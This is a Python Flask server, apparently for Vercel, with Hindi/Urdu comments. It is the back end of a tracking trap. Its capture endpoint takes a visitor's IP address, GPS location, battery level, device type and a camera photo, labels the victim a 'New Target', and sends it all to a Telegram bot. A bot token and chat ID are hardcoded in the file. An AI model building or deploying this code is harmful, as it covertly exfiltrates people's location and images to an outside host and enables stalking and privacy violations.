import os
import base64
import requests
from flask import Flask, render_template, request, jsonify

# Vercel ke liye template folder ka rasta (path) set karna zaroori hai
app = Flask(__name__, template_folder='../templates')

# --- CONFIG ---
# Apne Bot ka Token yahan dalain
BOT_TOKEN = "8643544666:AAFpPxaQ--xW5L5OlzJ4hOZCYmoEgWf5Mf8"
# Apni Numerical ID yahan dalain (e.g., "612345678")
CHAT_ID = "ID: 6908281054"

def send_telegram(text, photo_bytes=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
        # 1. Pehle Detail Report bhejna
        requests.post(url + "sendMessage", data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"})
        
        # 2. Agar photo hai to wo bhejna
        if photo_bytes:
            files = {'photo': ('capture.jpg', photo_bytes, 'image/jpeg')}
            requests.post(url + "sendPhoto", data={"chat_id": CHAT_ID}, files=files)
    except Exception as e:
        print(f"Telegram Error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        info = data.get('info', {})
        photo_raw = data.get('photo')
        
        # IP address nikalna
        ip = request.headers.get('x-forwarded-for', request.remote_addr)
        
        report = (f"🎯 <b>New Target!</b>\n\n"
                  f"🌐 IP: {ip}\n"
                  f"📍 Loc: {info.get('lat')}, {info.get('lon')}\n"
                  f"🔋 Battery: {info.get('battery')}\n"
                  f"📱 Dev: {info.get('platform')}")

        if photo_raw and "," in photo_raw:
            header, encoded = photo_raw.split(",", 1)
            photo_bytes = base64.b64decode(encoded)
            send_telegram(report, photo_bytes)
        else:
            send_telegram(report)

        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# --- VERCEL SPECIFIC ---
# Vercel ko 'app' object chahiye hota hai handle karne ke liye
# Ye line hatani nahi hai
                  
